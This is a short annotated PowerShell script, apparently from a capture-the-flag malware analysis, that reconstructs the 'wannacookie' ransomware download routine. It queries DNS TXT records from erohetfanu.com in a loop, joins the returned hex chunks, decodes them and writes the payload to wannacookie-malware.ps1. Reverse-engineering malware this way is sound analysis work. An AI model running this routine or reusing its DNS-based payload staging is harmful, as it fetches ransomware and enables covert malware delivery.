# Hex string to ASCII string
function H2A($a) {
 $o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; 
 return $o
};

# wannacookie.min.ps1 hex string
$f = "77616E6E61636F6F6B69652E6D696E2E707331"; 
$h = ""; 


# Malware download routine, from 0 to 64
# basing on the result of the dns query for the TXT record of 77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com
foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {
    # each query appends an hex string to $h
    $h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; 

# convert the hex string to ascii, then save it to file
($(H2A $h | Out-string)) | out-file wannacookie-malware.ps1